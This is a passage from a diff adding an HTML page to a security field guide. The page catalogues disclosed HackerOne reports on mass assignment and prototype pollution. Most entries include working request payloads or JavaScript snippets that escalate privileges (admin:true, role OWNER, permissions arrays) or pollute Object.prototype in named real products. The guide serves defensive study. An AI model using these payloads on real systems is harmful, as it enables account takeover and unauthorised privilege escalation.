+x-auth-token: &lt;victim_token&gt;
+Content-Type: application/json
+
+{"first_name":"&lt;cur&gt;","last_name":"&lt;cur&gt;","email":"attacker@example.com","role":"OWNER"}</div>
+<p class="insight"><b>Insight —</b> A field the UI presents as read-only is not protected server-side - resend the write request with the locked field included. When the write target is the email/recovery anchor and the protection is asymmetric (password endpoint guarded, bio endpoint not), a brief session-token hold escalates to permanent ATO via forgot-password. Verify persistence on a second backend to rule out an echo.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3766455" target="_blank" rel="noopener">hackerone.com/reports/3766455</a></span><a class="src" href="#report-3766455" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3370430" style="--sv:var(--sev-med)" data-sev="2" data-votes="68" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-supplied visibility field bypasses paid-tier gate</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3370430</b> · lovable-vdp · none · 68 votes · resolved</div>
+<div class="taxo"><span>Program <b>lovable-vdp</b></span><span>Surface <b>api</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Project creation trusts a client-supplied visibility value (Personal/Workspace) that is a premium-subscription feature; the server never checks the caller's plan before honoring it.</p>
+<h4>Method</h4><ol><li>Start creating a project and intercept POST /workspaces/{id}/projects</li><li>Set visibility to Personal or Workspace in the JSON body</li><li>Send; response is 201 and the project gets the premium visibility without a subscription</li></ol>
+<div class="pre">POST /workspaces/{WORKSPACE_ID}/projects
+
+{"description":"landing view","visibility":"Personal","initial_message":{"message":"landing view","files":[]}}</div>
+<p class="insight"><b>Insight —</b> Premium/entitlement features enforced only in the UI are often accepted verbatim from the request body. On every create/update, inject the fields that paid tiers control (visibility, plan, role, seats) and check whether the server re-validates entitlement server-side.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3370430" target="_blank" rel="noopener">hackerone.com/reports/3370430</a></span><a class="src" href="#report-3370430" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2431495" style="--sv:var(--sev-med)" data-sev="2" data-votes="62" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL mutation accepts staff-only package_name field</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2431495</b> · security · awarded · 62 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The AutosavePentestOpportunity GraphQL mutation lets the client set package_name (e.g. premium_p80), a field intended to be assigned only by internal reviewing staff; there is no server-side restriction on that input field.</p>
+<h4>Method</h4><ol><li>Create a new Pentest and let the form's autosave mutation fire</li><li>Intercept the AutosavePentestOpportunity mutation and add the extra input field "package_name": "premium_p80"</li><li>Complete/submit the form</li><li>Reopen it (OpportunityStatusQuery) and confirm package_name is set to the attacker-chosen value</li></ol>
+<div class="pre">mutation AutosavePentestOpportunity($input: AutosavePentestOpportunityInput!){
+  autosavePentestOpportunity(input: $input){ was_successful }
+}
+# add to $input:  "package_name": "premium_p80"</div>
+<p class="insight"><b>Insight —</b> GraphQL input objects often accept more fields than the UI submits. Enumerate the mutation's Input type (introspection) and inject privileged/internal fields (package_name, price, status, role, is_staff). Verify persistence via the corresponding query. Similar to #2040756.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2431495" target="_blank" rel="noopener">hackerone.com/reports/2431495</a></span><a class="src" href="#report-2431495" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1167753" style="--sv:var(--sev-med)" data-sev="2" data-votes="32" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Self-grant full permissions via client-controlled permissions array on store creation</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1167753</b> · shopify · awarded · 32 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A staff member limited to add/archive/unarchive development stores can reach the create_managed_store endpoint and supply an arbitrary `permissions` array in the request body, self-assigning every permission the server fails to constrain.</p>
+<h4>Method</h4><ol><li>As a staff member with only store add/archive permission, capture the store-create flow</li><li>POST to /&lt;org&gt;/stores/create_managed_store</li><li>Include a permissions array listing all desired permissions</li><li>Store is created with the elevated permission set</li></ol>
+<div class="pre">POST /100808/stores/create_managed_store
+Content-Type: application/json
+{"message":"","permissions":["applications","customers","orders","edit_orders","gift_cards","view_shopify_payments_payouts","view_billing_details","edit_private_apps"],"store_domain":"myStore1","collaborator_access_code":""}</div>
+<p class="insight"><b>Insight —</b> When creating/updating an object, add fields the UI never sends (permissions, role, is_admin, owner_id). Mass-assignment lets a low-priv actor set attributes the server should control; test every create endpoint with an injected privilege field.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1167753" target="_blank" rel="noopener">hackerone.com/reports/1167753</a></span><a class="src" href="#report-1167753" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-719856" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via unsafe deep-merge / path-setter (__proto__)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#719856</b> · nodejs-ecosystem · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>prototype pollution -&gt; app-specific gadget (default-optio</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Recursive deep-merge/extend and dotted-path setter utilities walk attacker-controlled keys and write to target[key] without excluding __proto__, so a __proto__ key reaches and mutates Object.prototype, adding a property visible on every object in the process.</p>
+<h4>Method</h4><ol><li>Find a sink that merges/extends/clones user JSON into an object, or a set(obj, path, value) helper that splits a dotted path.</li><li>Feed a JSON body or path whose first key is __proto__ (via JSON.parse so __proto__ is an own enumerable key, not the object's real prototype slot).</li><li>Confirm pollution by reading the injected property off a fresh empty object ({}.polluted).</li><li>Escalate per app: flip a default option/flag, inject a gadget the app later reads (e.g. a template/HTML sink -&gt; XSS, a shell/opts sink -&gt; RCE), or crash with a bad type -&gt; DoS.</li></ol>
+<div class="pre">// JSON deep-merge sink (dot-prop, utils-extend, extend-merge, objtools, supermixer, plain-object-merge, json8-merge-patch, jQuery $.extend deep):
+merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
+console.log({}.isAdmin); // true
+
+// dotted path-setter sink (dot-prop, nested-property, keyd, object-path-set):
+set(obj, '__proto__.polluted', 'yes');
+console.log({}.polluted); // 'yes'
+
+// jQuery deep extend:
+$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));</div>
+<p class="insight"><b>Insight —</b> Any library function that does recursive property assignment from user input is a prototype-pollution sink. Test every merge/extend/clone/defaults/set-by-path helper with a __proto__ (and constructor.prototype) key. Use JSON.parse so __proto__ is a real own key; a literal {__proto__:...} just sets the prototype and won't reproduce it.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/719856" target="_blank" rel="noopener">hackerone.com/reports/719856</a></span><a class="src" href="#report-719856" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-962895" style="--sv:var(--sev-med)" data-sev="2" data-votes="8" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Forced-browse edit of hidden POS user + user[admin]=1 backdoor</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#962895</b> · shopify · awarded · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>forced browsing -&gt; mass assignment -&gt; persistent admin</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Stocky POS users have no edit UI, but the edit endpoint /users/{id}/edit is reachable by forced browsing, and the update accepts an unexposed user[admin] parameter (mass assignment). An app admin can set a POS user's email to one they own and promote it to admin, creating a hidden backdoor account.</p>
+<h4>Method</h4><ol><li>Get a POS user's id by hovering its delete button on /preferences/users</li><li>Open /users/{id}/edit directly (no link exists in UI)</li><li>Set email to an attacker-owned address so the account can set a password</li><li>Intercept the save and append user[admin]=1</li></ol>
+<div class="pre">POST /users/{user_id}
+...
+user[email]=attacker@evil.tld&amp;user[admin]=1</div>
+<p class="insight"><b>Insight —</b> For objects hidden from the UI, guess the standard REST edit/update route (/{resource}/{id}/edit). Then diff a normal update body and try appending privileged attributes (admin, role, is_staff, owner). Missing-from-UI != missing-from-controller.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/962895" target="_blank" rel="noopener">hackerone.com/reports/962895</a></span><a class="src" href="#report-962895" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-292797" style="--sv:var(--sev-med)" data-sev="2" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Rails strong-params bypass: .each returns an unfiltered hash (CVE-2020-8164)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#292797</b> · rails · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>rails</b></span><span>Surface <b>web</b></span><span>Chain <b>strong-params bypass -&gt; mass assignment -&gt; privilege e</b></span></div>
+<h4>Root cause</h4><p style="margin:0">ActionController::Parameters#each yields the underlying unpermitted hash (like to_unsafe_h) instead of a permitted:false Parameters object, so code that iterates params with .each and passes values to a model silently reintroduces unpermitted, attacker-controlled keys.</p>
+<h4>Method</h4><ol><li>Identify a controller that processes params via params.each { |k,v| ... } rather than permit()</li><li>Submit extra parameters not present in the form (e.g. is_admin=true)</li><li>Because .each exposes all keys/values as a plain hash, the extra params flow into the model update</li></ol>
+<div class="pre">params = ActionController::Parameters.new(city: 'Nijmegen', country: 'Netherlands')
+params.each {}
+# =&gt; {"city"=&gt;"Nijmegen", "country"=&gt;"Netherlands"}  (unsafe hash, no permit needed)
+# vs params.select { true } =&gt; still permitted:false Parameters
+# Attacker adds &amp;is_admin=true to a form post; controller's params.each re-exposes it</div>
+<p class="insight"><b>Insight —</b> When auditing Rails source, grep controllers for params.each / params.map / params.to_a used to build model attributes. These enumerator methods historically leaked the unfiltered hash, defeating strong parameters. Send extra privileged keys (is_admin, role, user_id, verified) and watch for mass assignment.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/292797" target="_blank" rel="noopener">hackerone.com/reports/292797</a></span><a class="src" href="#report-292797" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3678828" style="--sv:var(--sev-med)" data-sev="2" data-votes="3" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Hidden status field lets low-priv user toggle object state (banner activate/deactivate)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3678828</b> · revive_adserver · none · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>revive_adserver</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The banner-edit handler accepted a hidden 'status' form field and applied it based only on the banner-edit permission, with no separate authorization check for activation/deactivation. An advertiser-level user could therefore change a state field they should not control.</p>
+<h4>Method</h4><ol><li>Open the banner edit screen as a low-privilege (advertiser) user.</li><li>Add/modify the hidden 'status' parameter in the edit POST to the desired active/inactive value.</li><li>Submit; the server overwrites banner status because it authorizes only 'edit', not the status change.</li></ol>
+<div class="pre">POST /www/admin/banner-edit.php HTTP/1.1
+... (advertiser session) ...
+
+bannerid=&lt;id&gt;&amp;status=1   # or status=0 to deactivate; hidden field honored without a status-specific permission check</div>
+<p class="insight"><b>Insight —</b> On edit/update forms, enumerate hidden fields and try tampering state-bearing ones (status, active, role, owner, is_admin). A single coarse 'can edit' check often gates a set of fields that individually deserve their own authorization — classic mass-assignment / parameter tampering.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3678828" target="_blank" rel="noopener">hackerone.com/reports/3678828</a></span><a class="src" href="#report-3678828" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1431042" style="--sv:var(--sev-low)" data-sev="1" data-votes="15" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via console.table properties argument (Node core, CVE-2022-21824)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1431042</b> · nodejs · none · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">console.table builds its column map keyed by the caller-supplied properties array without excluding __proto__; passing properties=['__proto__'] with a plain object argument assigns to Object.prototype numeric indices (empty strings), a pollution vector outside the usual merge/set family.</p>
+<h4>Method</h4><ol><li>Locate code that forwards user input into the second (properties) argument of console.table with an object as the first argument.</li><li>Pass ['__proto__'] as properties; add N properties to the first object to write indices 0..N-1.</li><li>Verify Object.prototype[0] === ''.</li></ol>
+<div class="pre">console.table({foo:'bar'}, ['__proto__']);
+// Object.prototype[0] === ''
+console.table({a:1,b:1,c:1}, ['__proto__']);
+// Object.prototype =&gt; { '0':'', '1':'', '2':'' }</div>
+<p class="insight"><b>Insight —</b> Prototype-pollution sinks are not limited to merge/set utilities. Any API that indexes an object by an untrusted key list (formatters, serializers, table/column builders) can pollute. When auditing, flag any user-controlled key array used to build a keyed map. Control here is weak (only empty strings to numeric keys) so impact is mainly DoS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1431042" target="_blank" rel="noopener">hackerone.com/reports/1431042</a></span><a class="src" href="#report-1431042" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-776371" style="--sv:var(--sev-low)" data-sev="1" data-votes="1" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side prototype pollution via chart/config deep-merge -&gt; DOM XSS</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#776371</b> · nodejs-ecosystem · none · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>web</b></span><span>Chain <b>client-side prototype pollution -&gt; polluted property read</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Chart.js recursively merges caller-supplied dataset/options config; its _merger recurses into any object-valued key including __proto__ (it does not hasOwnProperty-check the target key), so attacker-influenced chart config pollutes the browser's Object.prototype.</p>
+<h4>Method</h4><ol><li>Find a client library that deep-merges attacker-influenceable config (chart dataset/options, plugin options, settings).</li><li>Include a dataset/options object with a __proto__ key.</li><li>Read the injected property off {} to confirm; then chain to DOM XSS if the app later reads a polluted property into an HTML/attr sink.</li></ol>
+<div class="pre">new Chart(ctx, {
+  type: 'line',
+  data: { datasets: [ { data:[1,2] }, JSON.parse('{"__proto__":{"abc":"injected"}}') ] },
+  options: JSON.parse('{"__proto__":{"def":"injected"}}')
+});
+console.log({}.abc, {}.def); // both 'injected'
+
+// Fix pattern (patch): guard recursion with hasOwnProperty
+// if (Object.prototype.hasOwnProperty.call(target, key) &amp;&amp; isObject(tval) &amp;&amp; isObject(sval)) merge(...)</div>
+<p class="insight"><b>Insight —</b> Prototype pollution is not server-only: any front-end lib that deep-merges config you can influence is a client-side PP sink, and client-side PP frequently escalates to DOM XSS via a later gadget. Audit chart/UI/config-merge calls the same way as server merges.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/776371" target="_blank" rel="noopener">hackerone.com/reports/776371</a></span><a class="src" href="#report-776371" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-260632" style="--sv:var(--sev-none)" data-sev="0" data-votes="10" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Mass assignment on a create method to forge state/visibility/votes/category</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#260632</b> · legalrobot · awarded · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>legalrobot</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Meteor /Issues/insert method persists whatever object the client sends without whitelisting fields, so a user can set server-controlled attributes: publish without review (state:Open, public:true), pre-attach votes, or recategorize (type).</p>
+<h4>Method</h4><ol><li>Intercept the create call and add server-controlled fields to the inserted object</li><li>Set state/public to publish without moderation, or populate votes[] with arbitrary IDs, or change type to move the item into a privileged category</li><li>Observe the forged object in the public UI</li></ol>
+<div class="pre">["{\"msg\":\"method\",\"method\":\"/Issues/insert\",\"params\":[{\"name\":\"x\",\"state\":\"Open\",\"type\":\"feature\",\"public\":true,\"votes\":[\"id1\",\"id2\"]}],\"id\":\"23\"}"]</div>
+<p class="insight"><b>Insight —</b> On insert/update APIs (esp. Meteor/Mongo/Rails), add fields the UI never sends: state, public, is_admin, owner_id, votes, type. If the server round-trips them, you have mass assignment. Diff a GET response to learn attribute names.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/260632" target="_blank" rel="noopener">hackerone.com/reports/260632</a></span><a class="src" href="#report-260632" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-42961" style="--sv:var(--sev-none)" data-sev="0" data-votes="5" data-bounty="1400">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Self-promotion to admin via {"admin":true} mass assignment</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#42961</b> · x · USD 1400 · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The account update endpoint binds request JSON directly to the account model without restricting the role/admin field, so a plain member can PUT their own account id with {"admin":true} and become an admin.</p>
+<h4>Method</h4><ol><li>Find your own object id (leaked in the team_members listing response)</li><li>Send a PUT/PATCH to /accounts/{yourId} with the privilege field set true</li><li>Content-Type: application/json is required for the binding to occur; refresh to confirm admin role</li></ol>
+<div class="pre">PUT /accounts/54aa4ab19ea6961359001260 HTTP/1.1
+Host: fabric.io
+Content-Type: application/json; charset=UTF-8
+X-CSRF-Token: VALID
+
+{"admin":true}</div>
+<p class="insight"><b>Insight —</b> On any 'update profile/account' endpoint, try adding privilege fields you can observe in GET responses (is_admin, role, admin, is_owner). Backends using auto model-binding frequently accept them. The role field name is usually visible in the read response for the same object.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/42961" target="_blank" rel="noopener">hackerone.com/reports/42961</a></span><a class="src" href="#report-42961" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">API testing labs</a> (hands-on practice).</li>
+<li>All 16 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#technique-variants">Technique variants</a><a href="#self-promote-on-account-profile-update" style="padding-left:24px">↳ Self-promote on account/profile update</a><a href="#server-authoritative-workflow-state-fields" style="padding-left:24px">↳ Server-authoritative workflow / state fields</a><a href="#rebind-the-recovery-anchor-email-the-ato-variant" style="padding-left:24px">↳ Rebind the recovery anchor (email) — the ATO variant</a><a href="#client-dictated-create-fields-permissions-entitlements" style="padding-left:24px">↳ Client-dictated create fields (permissions / entitlements)</a><a href="#registration-role-type" style="padding-left:24px">↳ Registration role/type</a><a href="#graphql-input-objects" style="padding-left:24px">↳ GraphQL Input objects</a><a href="#forced-browse-targets-no-edit-ui-no-controller" style="padding-left:24px">↳ Forced-browse targets (no edit UI ≠ no controller)</a><a href="#prototype-pollution-recursive-property-write-sink" style="padding-left:24px">↳ Prototype pollution (recursive property-write sink)</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (16)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/api-testing" target="_blank" rel="noopener">⚑ PortSwigger: API testing</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
